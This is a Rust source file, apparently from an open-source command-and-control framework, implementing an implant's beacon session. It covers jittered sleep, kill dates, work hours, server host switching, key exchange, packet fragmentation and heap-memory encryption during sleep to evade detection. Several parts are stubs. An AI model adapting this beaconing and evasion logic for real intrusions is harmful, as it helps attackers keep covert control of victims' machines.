// Copyright (C) 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#![no_implicit_prelude]

use alloc::alloc::Global;
use alloc::collections::BTreeMap;
use core::alloc::Allocator;
use core::intrinsics::unlikely;
use core::mem::replace;
use core::ptr::NonNull;
use core::time::Duration;
use core::{cmp, matches};

use crate::c2::cfg::workhours::WorkHours;
use crate::c2::cfg::{Profile, DEFAULT_SLEEP};
use crate::c2::event::Broadcaster;
use crate::c2::mux::{Mux, Tasker};
use crate::c2::task::TID;
use crate::c2::{io_error_to_packet, is_packet_nop, key_crypt, read_packet, try_send, write_packet, write_unpack, BufferError, BufferResult, Cluster, CoreError, CoreResult, InfoClass, State};
use crate::com::{limits, Conn, Flag, Packet};
use crate::data::crypto::KeyPair;
use crate::data::memory::Manager;
use crate::data::rand::RandMut;
use crate::data::time::Time;
use crate::data::{Readable, Reader, Writable, Writer};
use crate::device::{Machine, ID};
use crate::io::ErrorKind;
use crate::prelude::*;
use crate::sync::mpsc::{sync_channel, Receiver, SyncSender, TryRecvError};
use crate::sync::Event;
use crate::thread::Builder;
use crate::util::log::{Log, MaybeLog, ThreadLog};
use crate::{debug, error, ignore_error, info, io, some_or_break, trace, warning};

const MAX_ERRORS: u8 = 5u8;
const TIMEOUT: Duration = Duration::from_secs(10);

pub struct Session<'a, A: Allocator = Global> {
    log:    ThreadLog,
    rand:   RandMut,
    state:  State,
    event:  Event,
    device: Machine<A>,
    memory: Option<&'a Manager>,

    keys:      KeyPair<A>,
    keys_next: Option<KeyPair<A>>,

    to_mux:   Broadcaster<Packet>,
    to_int:   Receiver<Packet>,
    to_send:  Receiver<Packet>,
    to_chan:  Option<SyncSender<Packet>>,
    to_queue: SyncSender<Packet>,

    peek:   Option<Packet>,
    frags:  BTreeMap<u16, Cluster>,
    errors: u8,

    kill:    Option<Time>,
    host:    NonNull<str>,
    work:    Option<WorkHours>,
    sleep:   Duration,
    jitter:  u8,
    profile: Profile<'a, A>,
}
pub struct SessionPair<'a, A: Allocator = Global> {
    pub mux:     Mux,
    pub session: Session<'a, A>,
}

impl<'a> Session<'a> {
    #[inline]
    pub fn new(l: Log, p: Profile<'a>) -> CoreResult<SessionPair<'a>> {
        Session::new_in(l, p, None, Global)
    }
}
impl<'a, A: Allocator> Session<'_, A> {
    #[inline]
    pub fn wake(&self) {
        ignore_error!(self.event.set());
    }
    #[inline]
    pub fn id(&self) -> ID {
        self.device.id
    }
}
impl<'b, 'a, A: Allocator + Clone + 'a + 'b> Session<'b, A> {
    pub fn new_in(l: Log, p: Profile<'a, A>, mem: Option<&'a Manager>, alloc: A) -> CoreResult<SessionPair<'a, A>> {
        let d = Machine::local_in(alloc.clone())?;
        let mut r = RandMut::new();
        let k = KeyPair::new_in(&mut r, alloc);
        let h = p.next(&mut r);
        let (i, to_int) = sync_channel(64);
        let (to_queue, to_send) = sync_channel(256);
        let (s, j, v, w) = (p.sleep(), p.jitter(), p.kill_date(), p.work_hours());
        let a: ThreadLog = l.into();
        let (m, to_mux) = Mux::new(d.id, &a, i, &to_queue)?;
        Ok(SessionPair {
            mux:     m,
            session: Session {
                to_int,
                to_mux,
                to_send,
                to_queue,
                log: a,
                rand: r,
                keys: k,
                peek: None,
                host: h,
                kill: v,
                work: w,
                frags: BTreeMap::new(),
                sleep: s,
                state: State::new(),
                event: Event::new(),
                device: d,
                memory: mem,
                errors: 0u8,
                jitter: j,
                profile: p,
                to_chan: None,
                keys_next: None,
            },
        })
    }

    #[inline]
    pub fn start(&mut self, dur: Option<Duration>) -> CoreResult<()> {
        self.connect(dur)?;
        self.thread();
        Ok(())
    }

    fn thread(&mut self) {
        let mut e = false;
        trace!(self.log, "[{}] Session network loop enter.", self.id());
        'outer: loop {
            if !self.wait() {
                break 'outer;
            }
            trace!(self.log, "[{}] Waking up..", self.id());
            if self.errors == 0 && self.frags.len() > 0 {
                self.sweep_frags();
            }
            if self.state.is_closing() {
                if self.state.is_closed() {
                    break 'outer;
                }
                if self.state.is_moving() {
                    info!(
                        self.log,
                        "[{}] Session is being migrated, shutting down.",
                        self.id()
                    );
                    break 'outer;
                }
                info!(
                    self.log,
                    "[{}] Shutdown was indicated, queuing Shutdown Packet.",
                    self.id()
                );
                self.peek = Some(Packet::new_id(TID::SV_SHUTDOWN, self.id()));
                self.state.set(State::SHUTDOWN);
                self.state.unset(State::CHANNEL);
                self.state.unset(State::CHANNEL_VALUE);
                self.state.unset(State::CHANNEL_UPDATED);
                ignore_error!(self.event.wait_for(TIMEOUT));
            }
            'task: loop {
                let n = match self.to_int.try_recv() {
                    Ok(v) => v,
                    Err(e) if e == TryRecvError::Disconnected => {
                        error!(
                            self.log,
                            "[{}] Disconnected from internal queue, signaling close: {e}!",
                            self.id()
                        );
                        self.close(false);
                        break 'outer;
                    },
                    Err(_) => break 'task,
                };
                trace!(
                    self.log,
                    "[{}] Processing Packet {n} from internal queue..",
                    self.id()
                );
                self.process_single(n)
            }
            if self.profile.switch(e, &mut self.rand) {
                self.host = self.profile.next(&mut self.rand);
                debug!(
                    self.log,
                    "[{}] Profile indicated to switch hosts, new host is '{}'.",
                    self.id(),
                    self.target()
                );
                // If we underflow, set it to zero.
                self.errors = self.errors.checked_sub(1).unwrap_or(0);
            }
            e = {
                trace!(
                    self.log,
                    "[{}] Connecting to '{}'..",
                    self.id(),
                    self.target()
                );
                let c = match self.profile.connector().connect(self.target(), Some(TIMEOUT)) {
                    Err(x) => {
                        if self.state.is_closing() {
                            break 'outer;
                        }
                        error!(
                            self.log,
                            "[{}] Failed to connect to '{}': {x:?}",
                            self.id(),
                            self.target()
                        );
                        if self.errors <= MAX_ERRORS {
                            (self.errors, e) = (self.errors + 1, true);
                            continue;
                        }
                        error!(
                            self.log,
                            "[{}] Too many errors, closing Session!",
                            self.id()
                        );
                        break 'outer;
                    },
                    Ok(c) => c,
                };
                debug!(
                    self.log,
                    "[{}] Connected to '{}'..",
                    self.id(),
                    self.target()
                );
                !self.connection(c)
            };
            if e {
                self.errors += 1;
            } else {
                self.errors = 0;
            }
            if self.errors > MAX_ERRORS {
                error!(
                    self.log,
                    "[{}] Too many errors, closing Session!",
                    self.id()
                );
                break 'outer;
            }
            if self.state.is_shutdown() {
                break 'outer;
            }
        }
        trace!(self.log, "[{}] Stopping transaction thread..", self.id());
        self.shutdown();
        trace!(self.log, "[{}] Session network loop exit.", self.id());
    }
    #[inline]
    fn wait(&self) -> bool {
        if !self.wait_check() {
            return false;
        }
        let w = self.sleep_adjusted();
        trace!(self.log, "[{}] Sleeping for {w:?}.", self.id());
        self.sleep_for(w);
        self.wait_check()
    }
    fn shutdown(&mut self) {
        // TODO(dij): Close Proxy here.
        self.to_mux.signal();
        self.state.set(State::CLOSED);
        self.frags.clear();
    }
    #[inline]
    fn target(&self) -> &str {
        unsafe { self.host.as_ref() }
    }
    fn sweep_frags(&mut self) {
        debug!(self.log, "[{}] Starting Frag sweep..", self.device.id);
        for (k, mut c) in self.frags.extract_if(|_, v| v.decrement()) {
            info!(
                self.log,
                "[{}] Clearing out-of-date Frag Group 0x{k:X}.", self.device.id
            );
            c.clear()
        }
        trace!(
            self.log,
            "[{}] Frag sweep completed, tracking {} Frag Groups.",
            self.id(),
            self.frags.len()
        );
    }
    fn wait_check(&self) -> bool {
        trace!(self.log, "[{}] Running wait check..", self.id());
        match self.profile.kill_date() {
            Some(v) if Time::now().is_after(v) => {
                info!(
                    self.log,
                    "[{}] Kill Date '{v}', was hit, triggering shutdown",
                    self.id()
                );
                return false;
            },
            _ => (),
        }
        let w = some_or_return!(self.profile.work_hours(), true);
        // Quick path return if no Workhours exists.
        loop {
            match w.work() {
                Some(t) => {
                    debug!(
                        self.log,
                        "[{}] WorkHours instructed us to wait for {t:?}.",
                        self.id()
                    );
                    self.sleep_for(t)
                },
                None => break,
            }
        }
        // Check after time is passed, just in case.
        match self.profile.kill_date() {
            Some(v) if Time::now().is_after(v) => {
                info!(
                    self.log,
                    "[{}] Kill Date '{v}', was hit, triggering shutdown",
                    self.id()
                );
                return false;
            },
            _ => (),
        }
        trace!(self.log, "[{}] Wait check done.", self.id());
        true
    }
    #[inline]
    fn key_sync_revert(&mut self) {
        if self.keys_next.is_none() {
            return;
        }
        self.keys_next = None;
        info!(
            self.log,
            "[{}] Queued KeyPair sync was canceled!",
            self.id()
        );
        bugtrack!(
            "c2::Session.key_sync_revert(): {} KeyPair queued sync canceled!",
            self.id()
        );
    }
    fn process_register(&mut self) {
        info!(
            self.log,
            "[{}/Cr0] Server indicated that we must re-register, resending SvRegister Packet!",
            self.id()
        );
        // TODO(dij): Proxy and Subs re-register hint here.
        let mut v = Packet::new_with(TID::SV_HELLO, self.rand.rand_u32() as u16, self.id());
        ignore_error!(self.write_info(InfoClass::Hello, &mut v));
        self.key_sync_generate(true, &mut v);
        // NOTE(dij): Errors here might indicate that the Mux Thread encountered
        //            a problem, but we'll catch them during the standard thread
        //            loop anyway, so no need to check here. The only error would
        //            be a full buffer and we really can't do anything about it.
        if let Err(e) = self.write(true, v) {
            warning!(
                self.log,
                "[{}/Cr0] Failed writing a Packet into the send queue! Is the buffer full? ({e})",
                self.id()
            );
            return;
        }
        self.wake(); // Skip the next wait loop so we return immediately.
    }
    fn close(&mut self, wait: bool) {
        let _ = wait;
    }
    fn sleep_for(&self, dur: Duration) {
        if self.event.is_set() {
            ignore_error!(self.event.reset());
            return;
        }
        let k = self.memory.as_ref().and_then(|m| {
            let mut b = [0u8; 64];
            self.rand.read_into(&mut b);
            debug!(
                self.log,
                "[{}] Freezing Heap memory with randomly generated key NOW!",
                self.id()
            );
            bugtrack!("c2::Session.sleep_for(): {} Freeze Key {b:?}", self.id());
            m.wrap(b);
            Some(b)
        });
        ignore_error!(self.event.wait_for(dur));
        ignore_error!(self.event.reset());
        if let Some(b) = k {
            debug!(self.log, "[{}] Thawing Heap memory!", self.id());
            // SAFETY: This is safe as there's no way 'k' can be Some without
            // the memory option returning it and being Some.
            unsafe {
                let m = self.memory.as_ref().unwrap_unchecked();
                m.wrap(b);
                m.trim(); // Free extra space
            }
        }
    }
    fn sleep_adjusted(&self) -> Duration {
        if self.jitter == 0 || self.sleep.as_secs() <= 1 {
            return self.sleep;
        }
        if self.jitter < 100 && (self.rand.rand_u32n(100) as u8) > self.jitter {
            return self.sleep;
        }
        let d = self.sleep.as_secs() as i64 + (self.rand.rand_u64n(self.sleep.as_secs()) as i64 * if self.rand.rand_u32n(2) == 1 { -1 } else { 1 });
        if d == 0 {
            self.sleep
        } else if d < 0 {
            Duration::from_secs(d.abs() as u64)
        } else {
            Duration::from_secs(d as u64)
        }
    }
    fn key_sync(&mut self) -> CoreResult<()> {
        let n = some_or_return!(self.keys_next.take(), Ok(()));
        debug!(
            self.log,
            "[{}/Crypt] Syncing KeyPair shared secret.",
            self.id()
        );
        if let Err(e) = self.keys.fill_private(&n.private_key()) {
            error!(
                self.log,
                "[{}/Crypt] KeyPair shared secret sync failed: {e}!",
                self.id()
            );
            return Err(e.into());
        }
        debug!(
            self.log,
            "[{}/Crypt] KeyPair shared secret sync completed!",
            self.id()
        );
        bugtrack!(
            "c2::Session.key_sync(): {} KeyPair shared secret sync completed! [Public {}, Shared: {:?}]",
            self.id(),
            self.keys.public_key(),
            self.keys.shared_key()
        );
        Ok(())
    }
    #[inline]
    fn process_details(&mut self, n: Packet) {
        match self.process_details_inner(n) {
            Ok(_) => debug!(
                self.log,
                "[{}/Cr0] Session details updated from Server!",
                self.id()
            ),
            Err(e) => error!(
                self.log,
                "[{}/Cr0] Failed to update Session details from the Server: {e}!",
                self.id()
            ),
        }
    }
    fn process_single(&mut self, mut n: Packet) {
        bugtrack!(
            "c2::Session.process_single(): n.id={:X}, n={n}, n.flags={}, n.device={}",
            n.id,
            n.flags,
            n.device
        );
        match n.id {
            TID::SV_RESYNC => self.process_resync(n),
            TID::SV_REGISTER => self.process_register(),
            TID::SV_COMPLETE if n.len() > 0 && n.flags & Flag::CRYPT != 0 => {
                if let Err(e) = self.key_sync_session(&mut n) {
                    warning!(
                        self.log,
                        "[{}/Cr0] KeyPair sync with server failed, communications might fail until next sync: {e}!",
                        self.id()
                    );
                }
            },
            TID::SV_SHUTDOWN if !self.state.is_closing() => {
                info!(
                    self.log,
                    "[{}/Cr0] Server indicated shutdown, closing Session.",
                    self.id()
                );
                self.close(false)
            },
            TID::SV_REFRESH => {
                // NOTE(dij): Go Divergence
                debug!(
                    self.log,
                    "[{}/Cr0] Device information refresh was requested.",
                    self.id()
                );
                let mut v = Packet::new_with(TID::RV_RESULT, n.job, self.id());
                match self.device.refresh() {
                    Err(e) => {
                        error!(self.log, "[{}/Cr0] Machine refresh failed: {e}!", self.id());
                        io_error_to_packet(&mut v, e);
                    },
                    Ok(_) => {
                        ignore_error!(self.write_info(InfoClass::Refresh, &mut v));
                        // DOES NOT ERROR
                    },
                }
                // NOTE(dij): Errors here might indicate that the Mux Thread encountered
                //            a problem, but we'll catch them during the standard thread
                //            loop anyway, so no need to check here. The only error would
                //            be a full buffer and we really can't do anything about it.
                if let Err(e) = self.write(true, v) {
                    warning!(
                        self.log,
                        "[{}/Cr0] Failed writing a Packet into the send queue! Is the buffer full? ({e})",
                        self.id()
                    );
                }
            },
            TID::SV_TIME => self.process_details(n),
            // NOTE(dij): Go Divergence
            TID::SV_PROFILE => self.process_profile(n),
            // NOTE(dij): Go Divergence
            _ if n.id > TID::SV_TIME => {
                if let Err(e) = self.to_mux.send(n) {
                    error!(
                        self.log,
                        "[{}/Cr0] Failed sending Packet to Task thread, signaling close: {e}!",
                        self.id()
                    );
                    self.close(false);
                }
            },
            _ => (),
        }
    }
    fn process_resync(&mut self, mut n: Packet) {
        debug!(
            self.log,
            "[{}/Cr0] Server sent a SvResync Packet associated with Job {}!",
            self.id(),
            n.job
        );
        let t = match n.read_u8() {
            Err(e) => {
                error!(
                    self.log,
                    "[{}/Cr0] Error reading SvResync Packet: {e}!",
                    self.id()
                );
                return;
            },
            Ok(v) => v,
        };
        if let Err(e) = self.read_info(t.into(), &mut n) {
            error!(
                self.log,
                "[{}/Cr0] Error reading SvResync Packet result: {e}!",
                self.id()
            );
            return;
        }
        debug!(
            self.log,
            "[{}/Cr0] Session details have been updated!",
            self.id()
        );
    }
    fn process_profile(&mut self, mut n: Packet) {
        // Make this in a block so the old Profile is dropped.
        {
            let p = match Profile::from_stream_in(&mut n, self.profile.allocator()) {
                Ok(v) => v,
                Err(e) => {
                    error!(
                        self.log,
                        "[{}/Cr0] Failed to read Profile data from a SvProfile Packet: {e}!",
                        self.id()
                    );
                    return;
                },
            };
            debug!(self.log, "[{}] Performing a Profile swap!", self.id());
            // Clear old Profile and drop it to free the memory.
            // Since we're not using the Profile's memory currently here,
            // it's safe to free it.
            let v = replace(&mut self.profile, p);
            // Explicitly signal to the compiler we don't need this value anymore.
            drop(v);
        }
        trace!(self.log, "[{}] Updating Session details.", self.id());
        self.sleep = self.profile.sleep();
        self.jitter = self.profile.jitter();
        self.kill = self.profile.kill_date();
        self.work = self.profile.work_hours();
        self.host = self.profile.next(&mut self.rand);
    }
    fn key_sync_next(&mut self) -> Option<Packet> {
        if self.keys_next.is_some() || self.state.is_moving() {
            return None;
        }
        // Have the % chance of changing be a factor of how LONG we sleep for, so
        // implants that wait a longer period of time won't necessarily change keys
        // less than ones that update in shorter periods.
        let d = (60 - cmp::max(self.sleep.as_secs() / 60, 60)) as u32;
        // Base will ALWAYS be 50.
        if self.rand.rand_u32n(50 + d) != 0 {
            return None;
        }
        info!(
            self.log,
            "[{}/Crypt] Generating new Public/Private KeyPair for next sync.",
            self.id()
        );
        let k = KeyPair::new_in(&mut self.rand, self.keys.allocator());
        let mut n = Packet::new_dev(self.id()).with_flags(Flag::CRYPT);
        ignore_error!(k.write(&mut n));
        bugtrack!(
            "c2::Session.key_sync_next(): {} KeyPair details queued for next sync. [Public {}]",
            self.id(),
            k.public_key()
        );
        self.keys_next = Some(k);
        Some(n)
    }
    #[inline]
    fn check_device(&self, n: &mut Packet) -> bool {
        if n.job == 0 && n.flags & Flag::PROXY == 0 && n.id > 1 {
            n.job = self.rand.rand_u32() as u16;
        }
        if n.device.is_empty() {
            n.device = self.id();
            return true;
        }
        n.device.eq(&self.device.id)
    }
    fn pick(&mut self, nones: bool) -> Option<Packet> {
        if let Some(v) = self.peek.take() {
            return Some(v);
        }
        if let Some(v) = self.to_send.try_recv().ok() {
            return Some(v);
        }
        if self.state.in_channel() {
            return self.to_send.try_recv().ok().or_else(|| {
                self.event.wait();
                None
            });
        }
        if !nones && self.state.in_channel() {
            return self
                .to_send
                .recv_timeout(self.sleep_adjusted())
                .ok()
                .or_else(|| self.key_sync_next().or_else(|| Some(Packet::new_dev(self.id()))));
        }
        if nones {
            return None;
        }
        Some(self.key_sync_next().unwrap_or_else(|| Packet::new_dev(self.id())))
    }
    fn next(&mut self, nones: bool) -> Option<Packet> {
        let mut n = some_or_return!(self.pick(nones), None);
        // TODO(dij): Check proxy tags here
        let mut v = self.to_send.try_recv().ok();
        if v.is_none() && self.check_device(&mut n) {
            self.state.set_last(0);
            return Some(n);
        }
        let (t, l) = (n.tags.clone(), self.state.last());
        if l == 0 || n.flags.group() != l {
            let (r, p) = self.next_packet(n, v, &t);
            self.peek = p;
            return Some(r.with_tags(&t));
        }
        let m = loop {
            let w = some_or_break!(v.take().or_else(|| self.to_send.try_recv().ok()), None);
            if w.flags.group() != l {
                break Some(w);
            }
        };
        self.state.set_last(0);
        if m.map_or(true, |x| x.flags.group() == l) {
            return Some(Packet::new_dev(self.id()).with_tags(&t));
        }
        let (r, p) = self.next_packet(n, v, &t);
        self.peek = p;
        Some(r.with_tags(&t))
    }
    fn connection(&mut self, mut c: Box<dyn Conn>) -> bool {
        // SAFETY: This cannot be None unless we're in a channel, which we're not.
        let mut n = unsafe { self.next(false).unwrap_unchecked() };
        self.state.unset(State::CHANNEL);
        if self.state.can_channel_start() {
            n.flags |= Flag::CHANNEL;
            trace!(
                self.log,
                "[{}] {}: Setting Channel Flag on next Packet!",
                self.id(),
                self.target()
            );
            self.state.set(State::CHANNEL);
        } else if n.flags & Flag::CHANNEL != 0 {
            trace!(
                self.log,
                "[{}] {}: Channel was set by outgoing Packet!",
                self.id(),
                self.target()
            );
            self.state.set(State::CHANNEL);
        }
        // KeyCrypt: Do NOT encrypt hello Packets.
        if n.id != TID::SV_HELLO {
            // KeyCrypt: Encrypt new Packet here to be sent.
            key_crypt(&mut n, &self.keys);
        }
        trace!(
            self.log,
            "[{}] {}: Sending Packet '{n}'..",
            self.id(),
            self.target()
        );
        let m = n.flags & Flag::CHANNEL != 0;
        let (w, t) = (self.profile.wrapper(), self.profile.transform());
        if let Err(e) = write_packet(&mut c, w, t, n) {
            error!(
                self.log,
                "[{}] {}: Error attempting to write Packet: {e}!",
                self.id(),
                self.target()
            );
            // KeyCrypt: Revert key exchange as send failed.
            self.key_sync_revert();
            return false;
        }
        if m && !self.state.in_channel() {
            self.state.set(State::CHANNEL);
        }
        let mut v = match read_packet(&mut c, w, t) {
            Ok(v) => v,
            Err(e) => {
                error!(
                    self.log,
                    "[{}] {}: Error attempting to read Packet: {e}!",
                    self.id(),
                    self.target()
                );
                return false;
            },
        };
        if v.id != TID::SV_COMPLETE {
            // KeyCrypt: Decrypt incoming Packet here to be read (if not a SvComplete).
            key_crypt(&mut v, &self.keys);
        }
        // KeyCrypt: "next" was called, check for a Key Swap.
        if self.key_sync().is_err() {
            return false;
        }
        if v.flags & Flag::CHANNEL != 0 && !self.state.in_channel() {
            trace!(
                self.log,
                "[{}] {}: Enabling Channel as a received Packet has a Channel Flag!",
                self.id(),
                self.target()
            );
            self.state.set(State::CHANNEL);
        }
        debug!(
            self.log,
            "[{}] {}: Received a Packet {}..",
            self.id(),
            self.target(),
            v
        );
        if let Err(e) = self.process(v) {
            error!(
                self.log,
                "[{}] {}: Error processing Packet data: {e}!",
                self.id(),
                self.target()
            );
            return false;
        }
        if !self.state.in_channel() {
            return true;
        }
        // TODO(dij):
        // panic!("not yet, im tired");
        false
    }
    fn process(&mut self, mut n: Packet) -> CoreResult<()> {
        if n.device.is_empty() || is_packet_nop(&n) {
            return Ok(());
        }
        bugtrack!(
            "c2::Session.receive(): n.id={}, n={n:X}, n.flags={}, n.device={}",
            n.id,
            n.flags,
            n.device
        );
        if n.flags & Flag::MULTI_DEVICE == 0 && !n.device.eq(&self.device.id) {
            // TODO(dij): Proxy handeling here.
            return Err(CoreError::InvalidPacketDevice);
        }
        if (n.flags & Flag::ONESHOT != 0) || (n.id == TID::SV_COMPLETE && n.flags & Flag::CRYPT == 0) {
            return Ok(());
        }
        if n.flags & Flag::MULTI != 0 {
            let mut x = n.flags.len();
            if x == 0 {
                warning!(
                    self.log,
                    "[{}] Received a single-device Multi Packet with an empty length, ignoring it!",
                    self.id()
                );
                return Err(CoreError::InvalidPacketCount);
            }
            debug!(
                self.log,
                "[{}] Received a single-device Multi Packet {n} that contains {x} Packets.",
                self.id()
            );
            while x > 0 {
                let v = Packet::from_stream(&mut n)?;
                trace!(self.log, "[{}] Unpacked Packet '{}'..", self.id(), v);
                self.process(v)?;
                x -= 1; // CAN'T UNDERFLOW DUE TO THE WHILE CHECK.
            }
            return Ok(());
        }
        if n.flags & Flag::FRAG != 0 && n.flags & Flag::MULTI == 0 {
            return self.process_frag(n);
        }
        self.process_single(n);
        Ok(())
    }
    fn key_sync_generate(&mut self, gen: bool, n: &mut Packet) {
        self.key_sync_revert();
        if gen {
            self.keys.fill(&mut self.rand);
        }
        ignore_error!(self.keys.write(n)); // DOES NOT ERROR
        n.flags |= Flag::CRYPT;
        debug!(
            self.log,
            "[{}/Crypt] Generated new KeyPair details!",
            self.id()
        );
        bugtrack!(
            "c2::Session.key_sync_generate(): {} KeyPair generated! [Public: {}]",
            self.id(),
            self.keys.public_key()
        );
    }
    fn process_frag(&mut self, mut n: Packet) -> CoreResult<()> {
        if n.id == TID::SV_DROP || n.id == TID::SV_REGISTER {
            warning!(
                self.log,
                "[{}] Indicated to clear Frag Group 0x{:X}!",
                self.id(),
                n.flags.group()
            );
            self.state.set_last(n.flags.group());
            if n.id == TID::SV_REGISTER {
                self.process_single(n);
            }
            return Ok(());
        }
        match n.flags.len() {
            0 => {
                warning!(
                    self.log,
                    "[{}] Received a Frag with an empty length, ignoring it!",
                    self.id()
                );
                return Err(CoreError::InvalidPacketCount);
            },
            1 => {
                trace!(
                    self.log,
                    "[{}] Received a single Frag (len=1) for Group 0x{:X}, clearing Flags!",
                    self.id(),
                    n.flags.group()
                );
                n.flags.clear();
                return self.process(n);
            },
            _ => (),
        }
        let (g, l) = (n.flags.group(), n.flags.len());
        trace!(
            self.log,
            "[{}] Processing Frag for Group 0x{g:X}, {} of {l}..",
            self.id(),
            n.flags.position()
        );
        let r = match self.frags.get_mut(&g) {
            None if n.flags.position() > 0 => {
                warning!(
                    self.log,
                    "[{}] Received an invalid Frag Group 0x{g:X}, responding to drop it!",
                    self.id()
                );
                ignore_error!(self.write(
                    true,
                    Packet::new_id(TID::SV_DROP, self.id()).with_flags(n.flags),
                ));
                return Ok(());
            },
            Some(c) => c.add(n).map(|_| c.is_done())?,
            None => {
                let c = Cluster::new(n)?;
                if unlikely(c.is_done()) {
                    trace!(
                        self.log,
                        "[{}] Frag Group 0x{g:X} was instant completed!",
                        self.id(),
                    );
                    return self.process(c.into());
                }
                self.frags.insert(g, c);
                return Ok(());
            },
        };
        if !r {
            return Ok(());
        }
        debug!(
            self.log,
            "[{}] Completed Frag Group 0x{:X}, {} total Packets.",
            self.id(),
            g,
            l
        );
        // SAFETY: Can't happen, 'r' is only True when it exists in the map.
        let v = unsafe { self.frags.remove(&g).unwrap_unchecked() }.into();
        self.process(v)
    }
    fn write(&self, wait: bool, mut n: Packet) -> BufferResult<()> {
        if self.state.is_closing() || self.state.is_send_closed() {
            return Err(CoreError::Closing.into());
        }
        if n.device.is_empty() {
            n.device = self.id();
        }
        trace!(
            self.log,
            "[{}] Trying to add Packet '{}' to queue.",
            self.id(),
            n
        );
        if limits::FRAG == 0 || n.size() <= limits::FRAG {
            let r = match self.to_chan.as_ref() {
                Some(c) => try_send(wait, c, n),
                None => try_send(wait, &self.to_queue, n),
            };
            match r {
                Some(v) if !wait => return Err(BufferError::Full(v)),
                _ => (),
            }
            if self.state.in_channel() {
                self.wake();
            }
            return Ok(());
        }
        let t = n.size();
        let mut m = (t / limits::FRAG) as u16;
        if (m as usize + 1) * limits::FRAG < t {
            m += 1;
        }
        let g = self.rand.rand_u32() as u16;
        let (x, mut i, mut p) = (n.size(), 0u16, 0usize);
        debug!(
            self.log,
            "[{}] Splitting Packet {n} into {m} Packets due to the Fragment size {}.",
            self.id(),
            limits::FRAG
        );
        while i < m && p < x {
            let mut b = Packet::new_with(n.id, n.job, n.device);
            (b.flags, b.limit) = (n.flags, limits::FRAG);
            b.flags.set_len(m);
            b.flags.set_group(g);
            b.flags.set_position(i);
            let (r, e) = match p.checked_add(b.try_extend_slice(&n[p..]).unwrap_or(0)) {
                Some(r) => (r, false),
                None => {
                    b.flags.set_len(0);
                    b.flags.set_position(0);
                    b.flags.set(Flag::ERROR);
                    b.clear();
                    ignore_error!(b.write_u8(0));
                    (0, true)
                },
            };
            trace!(
                self.log,
                "[{}] Trying to add Packet '{b}' to queue.",
                self.id()
            );
            let z = self
                .to_chan
                .as_ref()
                .and_then(|v| try_send(wait, v, b))
                .and_then(|v| try_send(wait, &self.to_queue, v))
                .map(BufferError::Full);
            if let Some(e) = z {
                warning!(
                    self.log,
                    "[{}] Received error during Packet queue: {e}!",
                    self.id()
                );
                return Err(e);
            }
            if self.state.in_channel() {
                self.wake();
            }
            if e {
                break;
            }
            (i, p) = (i + 1, p + r);
        }
        Ok(())
    }
    fn connect(&mut self, dur: Option<Duration>) -> CoreResult<()> {
        if !self.wait_check() {
            return Err(CoreError::KillDate(
                self.profile.kill_date().unwrap_or_default(),
            ));
        }
        let mut v = {
            debug!(
                self.log,
                "[{}] Trying to connect to '{}'..",
                self.id(),
                self.target()
            );
            let mut c = self.profile.connector().connect(self.target(), dur)?;
            debug!(
                self.log,
                "[{}] Connected to '{}'!",
                self.id(),
                self.target()
            );
            let mut n = Packet::new_with(TID::SV_HELLO, 0, self.id()).with_flags(Flag::CRYPT);
            ignore_error!(self.write_info(InfoClass::Hello, &mut n));
            self.key_sync_generate(false, &mut n);
            ignore_error!(c.set_write_timeout(dur));
            let (w, t) = (self.profile.wrapper(), self.profile.transform());
            write_packet(&mut c, w, t, n)?;
            ignore_error!(c.set_read_timeout(dur));
            read_packet(&mut c, w, t)?
        };
        if v.id != TID::SV_COMPLETE {
            return Err(CoreError::InvalidResponse(v.id));
        }
        self.key_sync_session(&mut v)?;
        Ok(())
    }
    fn key_sync_session(&mut self, n: &mut Packet) -> CoreResult<()> {
        if self.keys.is_synced() {
            warning!(
                self.log,
                "[{}/Crypt] Received Packet '{n}' with un-matched KeyPair data, did the server change?",
                self.id(),
            );
            return Ok(());
        }
        trace!(
            self.log,
            "[{}/Crypt] Received server Public Key data!",
            self.id()
        );
        if let Err(e) = self.keys.read(n) {
            error!(self.log, "[{}/Crypt] KeyPair read failed: {e}!", self.id());
            return Err(e.into());
        }
        let h = self.keys.public_key().hash();
        if !self.profile.is_key_trusted(h) {
            error!(
                self.log,
                "[{}/Crypt] Server PublicKey '{}' is NOT Trusted!",
                self.id(),
                self.keys.public_key()
            );
            return Err(CoreError::KeysRejected(h));
        }
        if let Err(e) = self.keys.sync() {
            error!(self.log, "[{}/Crypt] KeyPair sync failed: {e}!", self.id());
            return Err(e.into());
        }
        debug!(
            self.log,
            "[{}/Crypt] KeyPair sync with server '{}' completed!",
            self.id(),
            self.keys.public_key()
        );
        bugtrack!(
            "c2::Session.key_sync_session(): {} KeyPair synced! [Public: {}, Shared: {:?}]",
            self.id(),
            self.keys.public_key(),
            self.keys.shared_key()
        );
        Ok(())
    }
    fn process_details_inner(&mut self, mut n: Packet) -> io::Result<()> {
        match n.read_u8()? {
            // timeSleepJitter
            0 => {
                let j = n.read_i8()?;
                let d = n.read_i64()?;
                match j {
                    // NOTE(dij): This handles a special case where Script packets are
                    //            used to set the sleep/jitter since they don't have access
                    //            to the previous values.
                    //            A packet with a '-1' Jitter value will be ignored.
                    -1 => (),
                    _ if j > 100 => self.jitter = 100,
                    _ if j < 0 => self.jitter = 0,
                    _ => self.jitter = j as u8,
                }
                if d > 0 {
                    // Account for negatives, ditto from above ^.
                    self.sleep = Duration::from_nanos(d as u64);
                }
            },
            // timeKillDate
            1 => {
                let t = n.read_i64()?;
                self.kill = if t == 0 { None } else { Some(Time::from_nano(t)) };
            },
            // timeWorkHours
            2 => {
                let w = WorkHours::from_stream(&mut n)?;
                // The Golang version wakes the network thread, but since we're
                // on it, we don't need to do that.
                self.work = if w.is_empty() { None } else { Some(w) };
            },
            _ => return Err(ErrorKind::InvalidInput.into()),
        }
        let mut v = Packet::new_with(TID::RV_RESULT, n.job, self.id());
        ignore_error!(self.write_info(InfoClass::Sync, &mut v)); // DOES NOT ERROR
        if let Err(e) = self.write(true, v) {
            warning!(
                self.log,
                "[{}/Cr0] Failed writing a Packet into the send queue! Is the buffer full? ({e})",
                self.id()
            );
        }
        Ok(())
    }
